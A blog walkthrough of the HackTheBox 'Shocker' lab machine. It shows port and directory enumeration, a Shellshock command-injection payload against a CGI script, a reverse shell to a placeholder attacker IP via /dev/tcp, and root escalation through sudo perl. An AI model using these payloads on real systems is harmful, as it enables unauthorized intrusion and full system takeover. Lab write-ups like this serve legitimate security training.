---
layout: post
title: HackTheBox Shocker Walkthrough
image: /assets/img/blog/shocker/shellshock.png
accent_image: 
  background: url('/assets/img/blog/shocker/shellshock.png') center/cover
  overlay: false
accent_color: '#ccc'
theme_color: '#ccc'
description: >
  In this post you will find a step by step resolution walkthrough of the Shocker machine on HTB platform 2023.
invert_sidebar: true
---

# HackTheBox Shocker Walkthrough

Shocker is an easy machine that demonstrates the severity of the renowned Shellshock exploit, a vulnerability discovered in 2014 which affected millions of public-facing servers. 
* toc
{:toc}

## Enumeration
To enumerate the machine a first nmap scan to discover the open TCP ports on the machine was performed. Also when the open ports 
were retrieved a more in depth scan including fingerprinting was issued. With the following commands:
~~~bash
# First nmap scan
sudo nmap -sS -p- --min-rate 500 --open 10.10.10.56 -Pn -n -oG recon
# Exhaustive scan of the open ports
nmap -p80,2222 -sCV -Pn -n -oN openports 10.10.10.56
~~~

The results obtained by this scans showed some interesting open ports:
![800x400](/assets/img/blog/shocker/nmap.png "Nmap enumeration")
* Port 80 is open and is hosting a HTTP server, Apache httpd 2.4.18 
* Port 2222 is open and from the obtained banner looks like a ssh service version: OpenSSH 7.2p2

From the nmap scan we can see this is a linux machine, probably a Ubuntu distro.
## Web enumeration
As there are only two ports open and ssh is often not vulnerable by itself, we started enumeration via port TCP 80. Fingerprinting the website returns similar information as the obtained executing the nmap scripts. 
Moving on and visiting the website we obtain... ????coronavirus???? Anyway...
![800x400](/assets/img/blog/shocker/bug.png "Web frontpage")

Further enumeration of the site via directory bruteforcing for hidden directories and files with gobuster using a +220k entries wordlist and appending extensions as sh, php & txt was performed.
~~~bash
gobuster dir --url http://10.10.10.56/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,html,sh,pl -t 200
~~~
Suprisingly nothing interesting was found via this scan, but as this is running apache we checked if a `cgi-bin` directory exists.
> As cgi-bin directory is only reachable by appending a backslash (http://website/cgi-bin/) it is often not found on automatic directory searches.
{:.lead}

As `cgi-bin` exists we repeated our scan using it as a base directory.
~~~bash
gobuster dir --url http://10.10.10.56/cgi-bin/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,html,sh,pl -t 200
~~~
![800x400](/assets/img/blog/shocker/gobuster.png "Directory bruteforce")

Bingo! a suspicious executable file named `user.sh` was found. After visiting the new page we get a download of the file containg what looks like the output of the `uptime command execution`
![800x400](/assets/img/blog/shocker/user.png "user.sh")

At this point researching on google was the key, (AS IT IS MOST OF THE TIMES!) A valuable resource was found.
![800x400](/assets/img/blog/shocker/google.png "Google search")

ohhhh, So that is why this machine is called Shocker, Interesting…

After reviewing how the attack works, we intercepted a request to `http://10.10.10.56/cgi-bin/user.sh` with `burpsuite`, and sent it to the `repeater` to craft custom requests. 
To start, we crafted a request that if successful should return the id of the context user.
~~~bash
() { :; }; echo; echo; /bin/bash -c 'id'
~~~
![800x400](/assets/img/blog/shocker/burp1.png "burp")
Success! we got `Remote Command Execution` on the server.
## Okay nice, but what is ShellShock?
Shellshock is a security vulnerability in the Bash shell on Unix-based systems. It allows attackers to execute malicious code by exploiting how Bash handles environment variables. 
This could happen through various services, like web servers. Once exploited, attackers could gain unauthorized access to the system.

To protect against Shellshock, system administrators should promptly apply patches and updates provided by their software vendors. It's crucial to keep systems secure and regularly monitor for potential threats.

## Getting a foothold
As we got RCE, we tried to get access to the machine sending a malicious payload to get a reverse shell on a previously set listener. Lets start doing that:
~~~bash
nc -lvnp 443
~~~
![800x400](/assets/img/blog/shocker/nc.png "Nc listener")

Now from `burpsuite` we sent the folowing malicious payload:
~~~bash
User-Agent: () { :;}; echo; /bin/sh -i >& /dev/tcp/<attacker_ip>/443 0>&1
~~~
![800x400](/assets/img/blog/shocker/burp2.png "Malicious payload")

On our side, a connection was recieved. Great we are inside! 😈

![800x400](/assets/img/blog/shocker/shell.png "Reverse shell")
## TTY treatment
To get a more stable shell the following commands were executed:
~~~bash
script /dev/null -c bash
#Press:
ctl+z
stty raw -echo; fg
reset
xterm
export TERM=xterm
export SHELL=bash
stty rows 59 columns 236
~~~ 
At this point we got the flag located at `/home/shelly/user.txt`

## Privilege Escalation
To escalate privilege to root we started with an automatic enumeration performed with the `linpeas.sh` tool. 
Linpeas found information of all potential vectors that can be used to escalate privilege to root. In this case it looks like our user `Shelly` can execute the perl binary under the root context, 
which is potentially a security risk. To check if this binary is vulnerable to privesc we checked `GTFObins` ([https://gtfobins.github.io/gtfobins/perl/](https://gtfobins.github.io/gtfobins/perl/)), 
a very useful resource for privesc. We also confirmed the result by running the `sudo -l` command.
![800x400](/assets/img/blog/shocker/sudo.png "Sudo -l output")

Here is the exploit snippet from GTFObin website.
~~~bash
sudo perl -e 'exec "/bin/sh";'
~~~

At this point, after running the command  we successfully pwned the machine and we have got complete control of the system 💀💀💀

![800x400](/assets/img/blog/shocker/root.png "Root shell")

Last but not least we retrieved the flag located at `/root/root.txt`
